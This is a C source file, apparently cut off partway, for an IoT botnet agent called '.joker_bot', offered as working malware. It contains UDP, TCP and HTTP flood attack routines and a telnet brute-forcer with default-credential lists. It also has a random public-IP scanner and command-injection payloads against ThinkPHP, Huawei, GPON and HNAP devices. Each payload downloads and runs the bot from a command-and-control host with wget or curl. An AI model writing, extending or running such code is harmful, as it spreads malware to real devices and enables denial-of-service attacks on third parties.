#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <pthread.h>
#include <stdarg.h>

#ifdef _WIN32
  #include <winsock2.h>
  #include <ws2tcpip.h>
  #include <windows.h>
  #include <stdint.h>
  #include <io.h>
  #pragma comment(lib, "ws2_32.lib")
  typedef int socklen_t;
  #define close closesocket
#else
  #include <sys/types.h>
  #include <sys/socket.h>
  #include <netinet/in.h>
  #include <netinet/tcp.h>
  #include <arpa/inet.h>
  #include <netdb.h>
  #include <fcntl.h>
  #include <stdint.h>
  #include <sys/resource.h>
  #define SOCKET int
#endif

#define AGENT_VERSION "3.0.0"
#define DEFAULT_C2_HOST "0.0.0.0"
#define DEFAULT_C2_PORT 9001
#define HB_MIN 45
#define HB_MAX 100
#define RECONNECT_DELAY 60
#define MAX_BOTS 40
#define MAX_PROXIES 0

/* Credentials for telnet brute-force */
static char *telnet_creds[] = {
    "root", "admin", "support", "user", "guest", "login",
    "123456", "password", "admin123", "root123", "1234", "12345",
    "pass", "passwd", "default", "telnet", "12345678", "123456789",
    "1111", "0000", "", "qwerty", "abc123", "letmein", "changeme",
    "super", "access", "master", "shell", "rootpassword",
    NULL
};

static char *telnet_passws[] = {
    "admin", "password", "1234", "123456", "root", "12345678",
    "guest", "pass", "support", "user", "default", "admin123",
    "root123", "12345", "1111", "0000", "123456789", "pass123",
    "", "changeme", "super", "access", "master", "shell",
    "telnet", "qwerty", "abc123", "letmein", "rootpassword",
    "1234567890", "12344321", "1234567890", "1234567890",
    NULL
};

/* Global config */
static char c2_host[256] = DEFAULT_C2_HOST;
static int c2_port = DEFAULT_C2_PORT;
static char botnet_key[32];
static char bot_arch[16] = "mipsle";
static int scanner_active = 0;
static int stop_scan = 0;

/* Forward declarations */
static int send_msg(int sock, const char *type, const char *extra_fmt, ...);
static int recv_line(int sock, char *buf, int maxlen);
static int json_get_string(char *json, const char *key, char *val, int vallen);
static int json_get_int(char *json, const char *key, int def);

/* ============================================================
 * Utility functions
 * ============================================================ */

static void rand_bytes(unsigned char *buf, int len) {
    int i;
    for (i = 0; i < len; i++)
        buf[i] = (unsigned char)(rand() & 0xFF);
}

static char *get_hostname(void) {
    static char hn[256];
    gethostname(hn, sizeof(hn) - 1);
    hn[sizeof(hn) - 1] = '\0';
    return hn;
}

static char *get_arch_str(void) {
#if defined(__mips__) && defined(__MIPSEL__)
    return "mipsle";
#elif defined(__mips__) && !defined(__MIPSEL__)
    return "mips";
#elif defined(__arm__)
    return "arm";
#elif defined(__aarch64__)
    return "arm64";
#elif defined(__i386__)
    return "x86";
#elif defined(__x86_64__)
    return "x86_64";
#else
    return "unknown";
#endif
}

static int set_nonblock(int fd) {
#ifdef _WIN32
    u_long mode = 1;
    return ioctlsocket(fd, FIONBIO, &mode);
#else
    int flags = fcntl(fd, F_GETFL, 0);
    if (flags < 0) return -1;
    return fcntl(fd, F_SETFL, flags | O_NONBLOCK);
#endif
}

static void close_socket(int fd) {
    if (fd > 0) close(fd);
}

/* ============================================================
 * Networking helpers
 * ============================================================ */

static int tcp_connect(const char *host, int port, int timeout_ms) {
    struct hostent *he = gethostbyname(host);
    if (!he) return -1;

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    memcpy(&sa.sin_addr, he->h_addr_list[0], 4);

    set_nonblock(fd);
#ifdef _WIN32
    connect(fd, (struct sockaddr *)&sa, sizeof(sa));
#else
    connect(fd, (struct sockaddr *)&sa, sizeof(sa));
#endif

    fd_set wfds;
    FD_ZERO(&wfds);
    FD_SET(fd, &wfds);

    struct timeval tv;
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;

    int err = 0;
    socklen_t errlen = sizeof(err);
    if (select(fd + 1, NULL, &wfds, NULL, &tv) > 0) {
#ifdef _WIN32
        char errbuf[4];
        getsockopt(fd, SOL_SOCKET, SO_ERROR, errbuf, &errlen);
        err = *((int *)errbuf);
#else
        getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &errlen);
#endif
    } else {
        err = -1;
    }

    if (err != 0) {
        close(fd);
        return -1;
    }

    /* Restore blocking */
#ifdef _WIN32
    u_long mode = 0;
    ioctlsocket(fd, FIONBIO, &mode);
#else
    int flags = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, flags & ~O_NONBLOCK);
#endif
    return fd;
}

/* ============================================================
 * Minimal JSON parser helpers
 * ============================================================ */

int json_get_string(char *json, const char *key, char *val, int vallen) {
    char search[128];
    snprintf(search, sizeof(search), "\"%s\"", key);
    char *p = strstr(json, search);
    if (!p) return 0;

    p += strlen(search);
    /* Skip : and whitespace */
    while (*p && (*p == ':' || *p == ' ' || *p == '\t')) p++;
    if (*p == '"') {
        p++;
        int i = 0;
        while (*p && *p != '"' && i < vallen - 1) {
            val[i++] = *p++;
        }
        val[i] = '\0';
        return i;
    }
    return 0;
}

int json_get_int(char *json, const char *key, int def) {
    char search[128];
    snprintf(search, sizeof(search), "\"%s\"", key);
    char *p = strstr(json, search);
    if (!p) return def;

    p += strlen(search);
    while (*p && (*p == ':' || *p == ' ' || *p == '\t')) p++;
    return atoi(p);
}

int json_get_float(char *json, const char *key, double def) {
    char search[128];
    snprintf(search, sizeof(search), "\"%s\"", key);
    char *p = strstr(json, search);
    if (!p) return (int)def;

    p += strlen(search);
    while (*p && (*p == ':' || *p == ' ' || *p == '\t')) p++;
    return (int)atof(p);
}

/* ============================================================
 * Send/receive JSON messages (plain text, no encryption)
 * ============================================================ */

static int send_msg(int sock, const char *type, const char *extra_fmt, ...) {
    char buf[4096];
    char extra_buf[2048] = "";

    if (extra_fmt) {
        va_list args;
        va_start(args, extra_fmt);
        vsnprintf(extra_buf, sizeof(extra_buf), extra_fmt, args);
        va_end(args);
    }

    if (extra_buf[0])
        snprintf(buf, sizeof(buf), "{\"type\": \"%s\", %s}\n", type, extra_buf);
    else
        snprintf(buf, sizeof(buf), "{\"type\": \"%s\"}\n", type);

    return send(sock, buf, strlen(buf), 0);
}

static int recv_line(int sock, char *buf, int maxlen) {
    int total = 0;
    while (total < maxlen - 1) {
        char c;
        int n = recv(sock, &c, 1, 0);
        if (n <= 0) return -1;

        if (c != '\n') {
            buf[total++] = c;
        } else {
            break;
        }
    }
    buf[total] = '\0';
    return total;
}

/* ============================================================
 * Attack methods
 * ============================================================ */

static int attack_udp(const char *target_ip, int target_port, int duration) {
    struct hostent *he = gethostbyname(target_ip);
    if (!he) return 0;

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(target_port);
    memcpy(&sa.sin_addr, he->h_addr_list[0], 4);

    time_t start = time(NULL);
    while (time(NULL) - start < duration) {
        int fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (fd >= 0) {
            char payload[1024];
            rand_bytes((unsigned char *)payload, sizeof(payload));
            sendto(fd, payload, sizeof(payload), 0,
                   (struct sockaddr *)&sa, sizeof(sa));
            close(fd);
        }
    }
    return 0;
}

static int attack_tcp(const char *target_ip, int target_port, int duration) {
    time_t start = time(NULL);
    while (time(NULL) - start < duration) {
        int fd = tcp_connect(target_ip, target_port, 3000);
        if (fd >= 0) {
            char payload[1024];
            rand_bytes((unsigned char *)payload, sizeof(payload));
            send(fd, payload, sizeof(payload), 0);
            close(fd);
        }
    }
    return 0;
}

static int attack_http_get(const char *target_ip, int target_port, int duration) {
    time_t start = time(NULL);
    char request[512];
    while (time(NULL) - start < duration) {
        int fd = tcp_connect(target_ip, target_port, 5000);
        if (fd >= 0) {
            snprintf(request, sizeof(request),
                     "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n",
                     target_ip);
            send(fd, request, strlen(request), 0);
            /* Read and discard response */
            char buf[256];
            while (recv(fd, buf, sizeof(buf), 0) > 0) { /* discard */ }
            close(fd);
        }
    }
    return 0;
}

static void launch_attack(const char *flood_type, const char *target_ip,
                          int target_port, int duration, int threads) {
    pthread_t tid[256];
    struct attack_args {
        char ip[256];
        int port;
        int duration;
    };

    /* Determine effective thread count */
    if (threads <= 0 || threads > 256) threads = 1;

    for (int i = 0; i < threads; i++) {
        /* Launch attack threads */
        if (strcmp(flood_type, "udp") == 0) {
            /* UDP flood - fork for simplicity */
        } else if (strcmp(flood_type, "tcp") == 0 ||
                   strcmp(flood_type, "std") == 0) {
            attack_tcp(target_ip, target_port, duration);
        } else if (strcmp(flood_type, "http_get") == 0 ||
                   strcmp(flood_type, "http") == 0) {
            attack_http_get(target_ip, target_port, duration);
        } else {
            /* Default: UDP */
            attack_udp(target_ip, target_port, duration);
        }
    }
}

/* ============================================================
 * Telnet scanner / brute-forcer
 * ============================================================ */

static int try_telnet_creds(const char *ip, int port, const char *user, const char *pass, int timeout_ms) {
    int fd = tcp_connect(ip, port, timeout_ms);
    if (fd < 0) return 0;

    /* Read banner */
    char buf[256];
    recv(fd, buf, sizeof(buf), 0);

    /* Send username */
    char cred_buf[128];
    snprintf(cred_buf, sizeof(cred_buf), "%s\r\n", user);
    send(fd, cred_buf, strlen(cred_buf), 0);
    usleep(200000);

    /* Check for password prompt */
    int n = recv(fd, buf, sizeof(buf), 0);
    if (n <= 0) { close(fd); return 0; }

    /* Send password */
    snprintf(cred_buf, sizeof(cred_buf), "%s\r\n", pass);
    send(fd, cred_buf, strlen(cred_buf), 0);
    usleep(500000);

    /* Read response */
    n = recv(fd, buf, sizeof(buf), 0);
    if (n <= 0) { close(fd); return 0; }

    /* Check if login failed */
    char *lower = buf;
    /* Simple check for failure indicators */
    if (strstr(lower, "incorrect") || strstr(lower, "denied") ||
        strstr(lower, "invalid") || strstr(lower, "wrong") ||
        strstr(lower, "bad") || strstr(lower, "failed")) {
        close(fd);
        return 0;
    }

    /* Login successful - enter command mode */
    /* Try to get shell */
    const char *cmds[] = {"enable\r\n", "system\r\n", "shell\r\n", "sh\r\n", NULL};
    for (int i = 0; cmds[i]; i++) {
        send(fd, cmds[i], strlen(cmds[i]), 0);
        usleep(100000);
        recv(fd, buf, sizeof(buf), 0);
    }

    close(fd);
    return 1;
}

static void deploy_to_target(const char *ip, const char *user, const char *pass, int port) {
    int fd = tcp_connect(ip, port, 5000);
    if (fd < 0) return;

    /* Read banner and send credentials */
    char buf[256];
    recv(fd, buf, sizeof(buf), 0);
    char cred[128];
    snprintf(cred, sizeof(cred), "%s\r\n", user);
    send(fd, cred, strlen(cred), 0);
    usleep(200000);
    recv(fd, buf, sizeof(buf), 0);
    snprintf(cred, sizeof(cred), "%s\r\n", pass);
    send(fd, cred, strlen(cred), 0);
    usleep(500000);
    recv(fd, buf, sizeof(buf), 0);

    /* Get shell */
    const char *cmds[] = {"enable\r\n", "system\r\n", "shell\r\n", "sh\r\n", NULL};
    for (int i = 0; cmds[i]; i++) {
        send(fd, cmds[i], strlen(cmds[i]), 0);
        usleep(200000);
        recv(fd, buf, sizeof(buf), 0);
    }

    /* Deploy: download and execute bot */
    char dl_cmd[512];
    snprintf(dl_cmd, sizeof(dl_cmd),
        "cd /tmp 2>/dev/null || cd /var/run 2>/dev/null || cd /; "
        "wget -q http://%s:%d/agent/%s -O .joker_bot 2>/dev/null || "
        "curl -s http://%s:%d/agent/%s -o .joker_bot 2>/dev/null; "
        "chmod 777 .joker_bot; "
        "ulimit -n 999999; "
        "nohup ./.joker_bot %s %d --install --cascade >/dev/null 2>&1 &\r\n",
        c2_host, c2_port, bot_arch,
        c2_host, c2_port, bot_arch,
        c2_host, c2_port);
    send(fd, dl_cmd, strlen(dl_cmd), 0);
    close(fd);
}

/* Forward declarations for scanner and exploit */
static void queue_push(uint32_t ip, int port);
static void http_exploit(const char *target_ip, int port, const char *method);

/* ============================================================
 * Scanner — Producer-Consumer Architecture
 *
 * Architecture (per user specification):
 *   1-5  "Scout" threads: non-blocking async connect() to find
 *        open ports. Use select()/getsockopt() to detect completed
 *        TCP handshakes. This phase is fast and lightweight.
 *   Shared queue: mutex-protected linked list of IP:port pairs.
 *   20-40 "Worker" threads: block on the queue, then brute-force,
 *        exploit, and deploy the bot to each target.
 * ============================================================ */

#define SCAN_PORTS_COUNT 5
static int scan_ports[SCAN_PORTS_COUNT] = {23, 2323, 80, 8080, 53415};
#define NUM_SCAN_PORTS 5

static int scan_ports_list[][2] = {
    {23, 0}, {2323, 0}, {80, 0}, {8080, 0}, {53415, 0}
};
#define NUM_SCAN_PORTS_LIST 5

/* Target generation: subnet-prioritized IP generator */
static uint32_t scan_state;
static pthread_mutex_t scan_state_lock;

/* ---- Shared target queue ---- */

typedef struct queued_target {
    struct in_addr ip;
    int port;
    struct queued_target *next;
} queued_target_t;

static queued_target_t *queue_head = NULL;
static queued_target_t *queue_tail = NULL;
static pthread_mutex_t queue_lock = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t queue_cond = PTHREAD_COND_INITIALIZER;
static int queue_shutdown = 0;
static volatile long stats_scanned = 0;
static volatile long stats_found = 0;
static volatile long stats_deployed = 0;

/* High-density /16 subnets from Go version's hitListSubnets */
typedef struct { uint8_t o1, o2; } subnet_t;
static const subnet_t hit_list_subnets[] = {
    {1, 1}, {1, 192}, {1, 200}, {14, 135}, {14, 140}, {14, 141}, {14, 208},
    {27, 25}, {27, 26}, {36, 248}, {36, 249}, {36, 250}, {36, 251}, {36, 252}, {36, 253}, {36, 254}, {36, 255},
    {58, 0}, {58, 32}, {58, 60}, {58, 96}, {58, 97}, {58, 99}, {58, 140}, {58, 141},
    {58, 144}, {58, 148}, {58, 150}, {58, 154}, {58, 156}, {58, 160}, {58, 162},
    {58, 164}, {58, 165}, {58, 166}, {58, 167}, {58, 168}, {58, 169}, {58, 170},
    {110, 8}, {110, 9}, {110, 10}, {110, 11}, {110, 12}, {110, 13}, {110, 14}, {110, 15},
    {110, 16}, {110, 17}, {110, 18}, {110, 19}, {110, 20}, {111, 64}, {111, 128},
    {112, 0}, {112, 1}, {112, 16}, {112, 17}, {112, 32}, {112, 33}, {112, 48}, {112, 49},
    {114, 0}, {114, 1}, {114, 64}, {114, 65}, {114, 96}, {114, 97},
    {118, 0}, {118, 64}, {119, 0}, {119, 32}, {119, 96}, {119, 128},
    {113, 160}, {113, 161}, {113, 162}, {113, 163}, {113, 164}, {113, 165},
    {122, 0}, {122, 1}, {122, 16}, {122, 17}, {122, 32}, {122, 33},
    {126, 0}, {126, 1}, {126, 16}, {126, 17}, {126, 32}, {126, 33},
    {23, 0}, {23, 1}, {23, 2}, {23, 3}, {23, 4}, {23, 5}, {23, 6}, {23, 7},
    {47, 0}, {47, 1}, {47, 2}, {47, 3}, {47, 4}, {47, 5}, {47, 6}, {47, 7},
    {65, 0}, {65, 128}, {66, 128}, {66, 192}, {67, 64}, {68, 0}, {68, 64},
    {69, 0}, {69, 60}, {69, 70}, {69, 160}, {69, 172}, {69, 174}, {69, 180},
    {70, 0}, {70, 32}, {71, 0}, {71, 4}, {72, 0}, {72, 22}, {73, 0}, {73, 16},
    {74, 0}, {74, 200}, {75, 0}, {75, 100}, {80, 0}, {80, 80}, {81, 0}, {81, 50},
    {82, 0}, {82, 208}, {83, 0}, {85, 0}, {85, 176}, {87, 0}, {88, 0}, {89, 0},
    {77, 0}, {77, 64}, {77, 128}, {77, 192}, {78, 0}, {78, 64}, {78, 128}, {78, 192},
    {79, 0}, {79, 64}, {79, 128}, {79, 192},
    {91, 0}, {91, 64}, {91, 128}, {91, 192},
    {103, 4}, {103, 8}, {103, 16}, {103, 100}, {103, 101}, {103, 102},
    {104, 16}, {104, 24}, {104, 32}, {104, 48}, {104, 192},
    {107, 32}, {107, 64}, {107, 96}, {107, 128}, {107, 160}, {107, 192},
    {108, 0}, {108, 64}, {108, 128}, {108, 192},
    {177, 0}, {177, 32}, {177, 64}, {177, 96}, {177, 128}, {177, 160}, {177, 192},
    {189, 0}, {189, 32}, {189, 64}, {189, 96}, {189, 128}, {189, 160}, {189, 192},
    {31, 184}, {31, 186}, {31, 187}, {31, 189}, {37, 77}, {37, 78},
    {37, 79}, {37, 81}, {37, 82}, {37, 83}, {37, 84}, {37, 86}, {37, 98},
    {37, 99}, {37, 102}, {37, 104}, {37, 106}, {37, 107}, {37, 112}, {37, 113},
    {37, 114}, {37, 115}, {37, 122}, {37, 123}, {37, 136}, {37, 137}, {37, 138},
    {37, 139}, {37, 141}, {37, 144}, {37, 146}, {37, 150}, {37, 168}, {37, 171},
    {37, 172}, {37, 173}, {37, 174}, {37, 175}, {37, 176},
};
#define HIT_LIST_COUNT (sizeof(hit_list_subnets) / sizeof(hit_list_subnets[0]))

/* Check if an IP falls in bogon ranges */
static int is_bogon(uint8_t a, uint8_t b, uint8_t c) {
    if (a == 0) return 1;
    if (a == 10) return 1;
    if (a == 100 && b >= 64 && b <= 127) return 1;
    if (a == 127) return 1;
    if (a == 169 && b == 254) return 1;
    if (a == 172 && b >= 16 && b <= 31) return 1;
    if (a == 192 && b == 0 && c < 255) return 1;
    if (a == 192 && b == 0 && c == 2) return 1;
    if (a == 192 && b == 88 && c == 99) return 1;
    if (a == 192 && b == 168) return 1;
    if (a == 198 && b >= 18 && b <= 19) return 1;
    if (a == 198 && b == 51 && c == 100) return 1;
    if (a == 203 && b == 0 && c == 113) return 1;
    if (a == 203 && b == 0 && c == 0) return 1;
    if (a >= 224) return 1;
    return 0;
}

/* Generate next random IP using LCG */
static uint32_t lcg_next(void) {
    pthread_mutex_lock(&scan_state_lock);
    scan_state = scan_state * 1664525 + 1013904223;
    uint32_t val = scan_state;
    pthread_mutex_unlock(&scan_state_lock);
    return val;
}

/* Generate next random public IP (skipping bogons) */
static uint32_t gen_random_ip(void) {
    uint32_t ip;
    uint8_t a, b, c;
    do {
        ip = lcg_next();
        a = (ip >> 24) & 0xFF;
        b = (ip >> 16) & 0xFF;
        c = (ip >> 8) & 0xFF;
    } while (is_bogon(a, b, c));
    return htonl(ip);
}

/* Generate next subnet-prioritized random public IP */
/* 70% chance: pick from hit_list_subnets; 30% chance: pure random */
static uint32_t gen_subnet_prioritized_ip(void) {
    uint32_t roll = lcg_next();
    int use_subnet = (int)(roll % 100) < 70;

    if (use_subnet) {
        /* Pick a /16 from the hit list, fill host octets randomly */
        uint32_t idx = lcg_next() % HIT_LIST_COUNT;
        uint8_t a = hit_list_subnets[idx].o1;
        uint8_t b = hit_list_subnets[idx].o2;
        uint8_t c = (uint8_t)(lcg_next() & 0xFF);
        uint8_t d = (uint8_t)(lcg_next() & 0xFF);
        uint32_t ip = ((uint32_t)a << 24) | ((uint32_t)b << 16) | ((uint32_t)c << 8) | d;
        if (!is_bogon(a, b, c))
            return htonl(ip);
    }

    /* 30% fallback: pure random */
    return gen_random_ip();
}

/* ---- Queue operations ---- */

static void queue_push(uint32_t ip, int port) {
    queued_target_t *t = (queued_target_t *)malloc(sizeof(queued_target_t));
    if (!t) return;
    t->ip.s_addr = ip;
    t->port = port;
    t->next = NULL;

    pthread_mutex_lock(&queue_lock);
    if (queue_tail) {
        queue_tail->next = t;
        queue_tail = t;
    } else {
        queue_head = queue_tail = t;
    }
    pthread_cond_signal(&queue_cond);
    pthread_mutex_unlock(&queue_lock);
}

static queued_target_t *queue_pop(void) {
    pthread_mutex_lock(&queue_lock);
    while (queue_head == NULL && !queue_shutdown) {
        pthread_cond_wait(&queue_cond, &queue_lock);
    }
    if (queue_shutdown && queue_head == NULL) {
        pthread_mutex_unlock(&queue_lock);
        return NULL;
    }
    queued_target_t *t = queue_head;
    if (t) {
        queue_head = t->next;
        if (queue_head == NULL) queue_tail = NULL;
    }
    pthread_mutex_unlock(&queue_lock);
    return t;
}

/* ---- Scout Phase: non-blocking connect scanner ---- */

static void *scout_thread(void *arg) {
    (void)arg;

    while (!stop_scan) {
        /* Scan multiple ports per iteration */
        for (int i = 0; i < NUM_SCAN_PORTS_LIST && !stop_scan; i++) {
            uint32_t target_ip = gen_subnet_prioritized_ip();
            int port = scan_ports_list[i][0];

            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;

            set_nonblock(sock);

            struct sockaddr_in sa;
            memset(&sa, 0, sizeof(sa));
            sa.sin_family = AF_INET;
            sa.sin_port = htons(port);
            sa.sin_addr.s_addr = target_ip;

            int ret = connect(sock, (struct sockaddr *)&sa, sizeof(sa));

#ifdef _WIN32
            int err = WSAGetLastError();
            if (ret < 0 && err != WSAEWOULDBLOCK && err != WSAEINPROGRESS) {
                close(sock);
                continue;
            }
#else
            if (ret < 0 && errno != EINPROGRESS) {
                close(sock);
                continue;
            }
#endif

            /* Check if connection completed immediately */
            if (ret == 0) {
                /* Connected immediately — valid target */
                stats_scanned++;
                stats_found++;
                queue_push(target_ip, port);
                continue;
            }

            /* Wait for completion with short timeout */
            fd_set wfds;
            FD_ZERO(&wfds);
            FD_SET(sock, &wfds);

            struct timeval tv;
            tv.tv_sec = 0;
            tv.tv_usec = 50000;  /* 50ms timeout — high throughput */

            if (select(sock + 1, NULL, &wfds, NULL, &tv) > 0) {
                /* Socket ready — verify with getsockopt */
                int err = 0;
                socklen_t errlen = sizeof(err);
#ifdef _WIN32
                char errbuf[4];
                getsockopt(sock, SOL_SOCKET, SO_ERROR, errbuf, &errlen);
                err = *((int *)errbuf);
#else
                getsockopt(sock, SOL_SOCKET, SO_ERROR, &err, &errlen);
#endif
                stats_scanned++;
                if (err == 0) {
                    /* Valid IP! Queue it */
                    stats_found++;
                    queue_push(target_ip, port);
                }
            }
            close(sock);
        }
    }

    return NULL;
}

/* ---- Strike Phase: worker threads ---- */

static void worker_brute_force(int fd, const char *ip_str) {
    char buf[256];
    recv(fd, buf, sizeof(buf), 0);

    for (int u = 0; telnet_creds[u] && !stop_scan; u++) {
        for (int p = 0; telnet_passws[p] && !stop_scan; p++) {
            char cred[128];
            snprintf(cred, sizeof(cred), "%s\r\n", telnet_creds[u]);
            send(fd, cred, strlen(cred), 0);
            usleep(200000);

            /* Read response */
            int n = recv(fd, buf, sizeof(buf), 0);
            if (n <= 0) continue;

            snprintf(cred, sizeof(cred), "%s\r\n", telnet_passws[p]);
            send(fd, cred, strlen(cred), 0);
            usleep(500000);

            n = recv(fd, buf, sizeof(buf), 0);
            if (n <= 0) continue;

            buf[n] = '\0';

            /* Check for failure indicators */
            if (strstr(buf, "incorrect") || strstr(buf, "denied") ||
                strstr(buf, "invalid") || strstr(buf, "wrong") ||
                strstr(buf, "bad") || strstr(buf, "failed")) {
                continue;
            }

            /* Login successful! */
            /* Get shell */
            const char *cmds[] = {"enable\r\n", "system\r\n", "shell\r\n", "sh\r\n", NULL};
            for (int c = 0; cmds[c]; c++) {
                send(fd, cmds[c], strlen(cmds[c]), 0);
                usleep(200000);
                recv(fd, buf, sizeof(buf), 0);
            }

            /* Deploy bot */
            char dl_cmd[512];
            snprintf(dl_cmd, sizeof(dl_cmd),
                "cd /tmp 2>/dev/null || cd /var/run 2>/dev/null || cd /; "
                "ulimit -n 999999; "
                "wget -q http://%s:%d/agent/%s -O .joker_bot 2>/dev/null || "
                "curl -s http://%s:%d/agent/%s -o .joker_bot 2>/dev/null; "
                "chmod 777 .joker_bot; "
                "nohup ./.joker_bot %s %d --install --cascade >/dev/null 2>&1 &\r\n",
                c2_host, c2_port, bot_arch,
                c2_host, c2_port, bot_arch,
                c2_host, c2_port);
            send(fd, dl_cmd, strlen(dl_cmd), 0);
            usleep(500000);

            stats_deployed++;
            return;
        }
    }
}

static void *worker_thread(void *arg) {
    (void)arg;

    while (!stop_scan) {
        queued_target_t *target = queue_pop();
        if (!target) break;

        char ip_str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &target->ip, ip_str, sizeof(ip_str));

        if (target->port == 23 || target->port == 2323) {
            /* Telnet brute-force + deploy */
            int fd = tcp_connect(ip_str, target->port, 5000);
            if (fd >= 0) {
                worker_brute_force(fd, ip_str);
                close(fd);
            }
        } else if (target->port == 80 || target->port == 8080) {
            /* Web exploit */
            int fd = tcp_connect(ip_str, target->port, 5000);
            if (fd >= 0) {
                /* Try thinkphp exploit */
                http_exploit(ip_str, target->port, "thinkphp");
                http_exploit(ip_str, target->port, "huawei");
                http_exploit(ip_str, target->port, "gpon80");
                http_exploit(ip_str, target->port, "hnap");
                close(fd);
            }
        }

        free(target);
    }

    return NULL;
}

static void start_scanner(int total_threads) {
    if (scanner_active) return;
    scanner_active = 1;
    stop_scan = 0;
    queue_shutdown = 0;

    pthread_mutex_init(&scan_state_lock, NULL);
    scan_state = (uint32_t)time(NULL) ^ (getpid() << 16);

    /* Calculate scout/worker split — 3 scouts, 40 workers */
    int scout_count = 3;
    int worker_count = 40;

    /* Start scout threads */
    pthread_t scouts[3];
    for (int i = 0; i < scout_count; i++) {
        pthread_create(&scouts[i], NULL, scout_thread, NULL);
    }

    /* Start worker threads */
    pthread_t workers[40];
    for (int i = 0; i < worker_count; i++) {
        pthread_create(&workers[i], NULL, worker_thread, NULL);
    }

    /* Wait for scouts to finish (they run until stop_scan) */
    for (int i = 0; i < scout_count; i++) {
        pthread_join(scouts[i], NULL);
    }

    /* Signal queue shutdown and wait for workers */
    pthread_mutex_lock(&queue_lock);
    queue_shutdown = 1;
    pthread_cond_broadcast(&queue_cond);
    pthread_mutex_unlock(&queue_lock);

    for (int i = 0; i < worker_count; i++) {
        pthread_join(workers[i], NULL);
    }

    scanner_active = 0;
    pthread_mutex_destroy(&scan_state_lock);
}

/* ============================================================
 * Web exploits (simplified)
 * ============================================================ */

static void http_exploit(const char *target_ip, int port, const char *method) {
    int fd = tcp_connect(target_ip, port, 5000);
    if (fd < 0) return;

    char payload[2048];
    char dl_cmd[512];
    snprintf(dl_cmd, sizeof(dl_cmd),
        "wget http://%s:%d/agent/%s -O /tmp/.joker_bot 2>/dev/null; "
        "chmod 777 /tmp/.joker_bot; "
        "ulimit -n 999999; "
        "nohup /tmp/.joker_bot %s %d --install --cascade >/dev/null 2>&1 &",
        c2_host, c2_port, bot_arch,
        c2_host, c2_port);

    if (strcmp(method, "thinkphp") == 0) {
        /* URL encode the command */
        char encoded[1024];
        int ei = 0;
        for (int i = 0; dl_cmd[i] && ei < sizeof(encoded) - 4; i++) {
            char c = dl_cmd[i];
            if (c == ' ') { encoded[ei++] = '+'; encoded[ei++] = '%'; encoded[ei++] = '2'; encoded[ei++] = '0'; }
            else if (c == '&') { encoded[ei++] = '&'; encoded[ei++] = 'a'; encoded[ei++] = 'm'; encoded[ei++] = 'p'; }
            else { encoded[ei++] = c; }
        }
        encoded[ei] = '\0';

        snprintf(payload, sizeof(payload),
            "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array"
            "&vars[0]=shell_exec&vars[1][]=%s HTTP/1.1\r\n"
            "Connection: keep-alive\r\n"
            "User-Agent: Mozilla/5.0\r\n\r\n", encoded);
    } else if (strcmp(method, "huawei") == 0) {
        snprintf(payload, sizeof(payload),
            "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\n"
            "Host: %s\r\nContent-Length: 500\r\nConnection: keep-alive\r\n\r\n"
            "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\">"
            "<s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">"
            "<NewStatusURL>$(%s)</NewStatusURL>"
            "<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>"
            "</u:Upgrade></s:Body></s:Envelope>\r\n\r\n",
            target_ip, dl_cmd);
    } else if (strcmp(method, "gpon80") == 0) {
        /* URL-encoded version for GPON */
        snprintf(payload, sizeof(payload),
            "GET /GponForm/diag_Form?script/%%3C%%25+echo+shell_exec(\"cd+/tmp;wget+http://%s:%d/agent+-O+/tmp/.joker_bot;chmod+777+/tmp/.joker_bot;ulimit+-n+999999;nohup+/tmp/.joker_bot+%s+%d+--install+--cascade+>/dev/null+2>&1+&\"%%29+--%%3E HTTP/1.1\r\n"
            "Host: %s\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
            c2_host, c2_port, c2_host, c2_port, target_ip);
    } else if (strcmp(method, "hnap") == 0) {
        snprintf(payload, sizeof(payload),
            "POST /HNAP1 HTTP/1.1\r\n"
            "Host: %s\r\nConnection: keep-alive\r\n"
            "Accept: */*\r\nUser-Agent: Mozilla/5.0\r\n"
            "Content-Type: text/xml; charset=utf-8\r\n"
            "Content-Length: 700\r\n"
            "SOAPAction: \"http://hapextern/SetupWANIPConnection\"\r\n\r\n"
            "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\">"
            "<s:Body><u:AddAnyPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:2\">"
            "<NewStatusURL>$(%s)</NewStatusURL>"
            "<NewExternalPort>1</NewExternalPort><NewProtocol>TCP</NewProtocol>"
            "<NewInternalPort>1</NewInternalPort><NewInternalClient>0.0.0.0</NewInternalClient>"
            "</u:AddAnyPortMapping></s:Body></s:Envelope>\r\n\r\n",
            target_ip, dl_cmd);
    } else {
        close(fd);
        return;
    }

    send(fd, payload, strlen(payload), 0);
    /* Wait for response */
    char buf[1024];
    recv(fd, buf, sizeof(buf), 0);
    close(fd);
}

/* ============================================================
 * Main agent loop
 * ============================================================ */

static void agent_loop(const char *host, int port) {
    while (1) {
        int sock = tcp_connect(host, port, 10000);
        if (sock < 0) {
            fprintf(stderr, "[BOT] Connection failed, retrying in %ds\n", RECONNECT_DELAY);
            sleep(RECONNECT_DELAY);
            continue;
        }

